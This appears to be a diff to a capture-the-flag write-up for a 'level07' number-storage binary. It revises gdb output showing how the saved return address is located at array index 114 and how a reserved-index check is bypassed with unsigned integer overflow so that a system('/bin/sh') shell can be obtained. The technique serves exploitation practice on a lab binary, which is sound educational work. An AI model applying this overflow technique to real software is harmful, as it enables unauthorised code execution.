@@ -36,22 +36,37 @@ That means that system '/bin/sh' can be passed
 
 We need to find offset
 
-(gdb) i f
-Stack level 0, frame at 0xffffd530:
- eip = 0x80486d8 in read_number; saved eip 0x8048930
- called by frame at 0xffffd720
- Arglist at 0xffffd528, args: 
- Locals at 0xffffd528, Previous frame's sp is 0xffffd530
+(gdb) b * 0x080488ea
+Breakpoint 1 at 0x80488ea
+(gdb) r
+Starting program: /home/users/level07/level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+
+Breakpoint 1, 0x080488ea in main ()
+(gdb) x $esp + 0x24
+0xffffd554:     0
+(gdb) i  f
+Stack level 0, frame at 0xffffd720:
+ eip = 0x80488ea in main; saved eip 0xf7e45513
+ Arglist at 0xffffd718, args: 
+ Locals at 0xffffd718, Previous frame's sp is 0xffffd720
  Saved registers:
-  ebp at 0xffffd528, eip at 0xffffd52c
+  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
 
-  (gdb) where
-#0  0x080486d8 in read_number ()
-#1  0x08048930 in main ()
+0xffffd71c - 0xffffd554 = 0x1c8 = 456, 456 / 4 = 114th position in array
 
-ffffd530 - ffffd528 = 0x8, 464 - 8 = 456, 456 bytes = 114th position in array
-
-Unfortunatelly this position is reversed
+Unfortunatelly this position is reserved
 
  Index: 114
  *** ERROR! ***
@@ -59,7 +74,7 @@ Unfortunatelly this position is reversed
  *** ERROR! ***
  Failed to do store command
 
-Luckily array has unsigned type, so we can write 114 with overflow
+Luckily array has unsigned type, so we still can write 114 by overflowing it
 
 0x1c8 + UINT_MAX + 0x1 = 4294967752
 
@@ -82,20 +97,3 @@ $ su level08
 Password: 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
-
-
-Breakpoint 3, 0x080489ea in main ()
-(gdb) i f
-Stack level 0, frame at 0xffffd720:
- eip = 0x80489ea in main; saved eip 0xf7e45513
- Arglist at 0xffffd718, args: 
- Locals at 0xffffd718, Previous frame's sp is 0xffffd720
- Saved registers:
-  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
-
-  Stack level 0, frame at 0xffffd720:
- eip = 0x80489f1 in main; saved eip 0xf7e45513
- Arglist at unknown address.
- Locals at unknown address, Previous frame's sp is 0xffffd720
- Saved registers:
-  eip at 0xffffd71c
